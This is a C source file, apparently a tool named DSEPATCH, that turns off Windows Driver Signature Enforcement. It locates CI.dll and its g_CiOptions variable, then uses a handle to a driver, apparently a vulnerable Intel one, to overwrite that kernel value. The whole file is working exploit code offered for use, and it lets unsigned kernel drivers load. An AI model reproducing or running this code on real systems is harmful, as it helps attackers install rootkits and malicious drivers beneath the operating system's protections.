/*!
 * DSEPATCH (c) Driver Signing Enforcement 
 * Patcher for anything from Windows 8 to
 * present.
!*/
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "util.h"
#include "ci.h"
#include "intel.h"

int main(int argc, char **argv)
{
  HANDLE hDriver       = 0;
  LPVOID CiImagepMem   = 0;
  LPVOID CiImageBase   = 0;
  LPVOID CigOptsBase   = 0;
  LPVOID PhysAddr      = 0;
  PPEB   PebPtr        = 0;
  DWORD  CiImageLen    = 0;
  ULONG  CurrentCiVal  = 0;
  ULONG  CurrentCiFix  = 1;

  CiImageBase = KeGetBase("CI.dll", &CiImageLen);
  if ( (CiImageBase != NULL) )
  {
    printf("[+] Leaked CI @ %p\n", CiImageBase);
    if ( (CigOptsBase = GetCiOptions1(CiImageBase)) != NULL )
    {
      printf("[+] Leaked CI!g_CiOptions @ %p\n", CigOptsBase);

      PebPtr = NtCurrentTeb->ProcessEnvironmentBlock;

      if ( PebPtr->OSBuildNumber < 16299 ) {
	      printf("[ ] Currently does not support anything less than build 16299\n");
	      return 0;
      };


      if ( (hDriver = GetHandle()) != NULL ) 
      {
        printf("[+] Opened Device Handle %p\n", hDriver);
	MemCpy(hDriver, &CurrentCiVal, CigOptsBase, 4);

	printf("[+] CI!g_CiOptions = 0x%x\n", CurrentCiVal);
	MemCpy(hDriver, CigOptsBase, &CurrentCiFix, 4);

	printf("[+] Wrote 0x%x to CI!g_CiOptions\n", CurrentCiFix);
	MemCpy(hDriver, &CurrentCiFix, CigOptsBase, 4);

	printf("[+] CI!g_CiOptions = 0x%x\n", CurrentCiFix);
      };
    };
  };
};
